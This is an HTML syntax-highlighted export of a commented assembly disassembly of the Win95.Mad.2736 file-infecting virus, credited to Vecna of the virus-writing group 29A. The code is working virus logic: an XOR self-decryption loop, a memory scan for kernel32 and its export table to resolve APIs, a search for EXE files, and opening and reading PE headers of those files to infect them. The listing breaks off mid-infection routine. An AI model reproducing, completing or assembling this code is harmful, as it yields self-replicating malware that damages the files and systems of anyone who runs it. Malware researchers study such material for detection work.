<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Win95.Mad.2736 disassembly</span><span class="sc0">
</span><span class="sc1">;(c) Vecna/29A</span><span class="sc0">

</span><span class="sc1">;Here is the disassembly of one of the first Win95 virus, that implemented</span><span class="sc0">
</span><span class="sc1">;several original features. It was the first encripted win95 virus, and</span><span class="sc0">
</span><span class="sc1">;the second one to not add a new section to the host (the first according</span><span class="sc0">
</span><span class="sc1">;to AVPVE) the first was actually Win32.Jacky. When executed,</span><span class="sc0">
</span><span class="sc1">;it search the kernel32 in memory for GetProcAddress and GetModuleHandleA,</span><span class="sc0">
</span><span class="sc1">;and call they everytime that need get a function, instead of searching</span><span class="sc0">
</span><span class="sc1">;once and storing the API address. Anyway, the API search dont seens reliable</span><span class="sc0">
</span><span class="sc1">;enought, and i cant make it replicate in my machine.</span><span class="sc0">

</span><span class="sc1">;A special thank goes this time for VirusBuster, my virus provider, that</span><span class="sc0">
</span><span class="sc1">;always have nice virii for me... :-)</span><span class="sc0">
</span><span class="sc1">;Tasm /m w95mad.asm</span><span class="sc0">


</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">old_RVA</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2005h</span><span class="sc0">                            </span><span class="sc1">;setup host entry point</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">HostEntry</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SaveEBP</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_encript</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A6Bh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Key</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">decript_loop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decript_loop</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">start_encript</span><span class="sc0">

</span><span class="sc5">HostEntry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SaveEBP</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Key</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">start_encript</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">TotalInf</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4550h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">search_kernel</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">return_host</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Seed</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14Ch</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_kernel</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_kernel</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">                             </span><span class="sc1">;is a DLL?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_kernel</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">
       </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_kernel</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelBase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;number of sections</span><span class="sc0">
</span><span class="sc5">search_edata</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ADE.'</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_edata</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'AT'</span><span class="sc0">               </span><span class="sc1">;search all sectionz for the</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">found_export</span><span class="sc0">                     </span><span class="sc1">;export section</span><span class="sc0">
</span><span class="sc5">no_edata</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_edata</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">return_host</span><span class="sc0">

</span><span class="sc5">found_export</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelBase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelBase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pAPIRVA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">search_APIs</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelBase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szGetProcAddres</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pGetProcAddress</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">extract_addr</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pGetModuleHdle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szGetModuleHdle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">extract_addr</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_APIs</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pGetProcAddress</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">return_host</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pGetModuleHdle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">return_host</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pGetModuleHdle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">return_host</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_GetDir</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_check_payload</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                                 </span><span class="sc1">;save current directory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">find_filez</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_FFile</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FINDATA</span><span class="sc0">                   </span><span class="sc1">;start of find struct</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExeMask</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">SearchHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">change_dir</span><span class="sc0">                             </span><span class="sc1">;error, then go down a dir</span><span class="sc0">

</span><span class="sc5">infect_next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileName</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Seed</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">186A0h</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">error_close</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Security</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;maybe a safeguard flag?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">error_close</span><span class="sc0">                           </span><span class="sc1">;win95 never set this, so</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_CreateFile</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;probably is a safeguard</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">                         </span><span class="sc1">;to no infect own hdd</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FINDATA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">file_seek</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEPointer</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">error_close</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">PEPointer</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">file_seek</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEHeader</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8D0h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">PEHeader</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4550h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">error_close</span><span class="sc0">
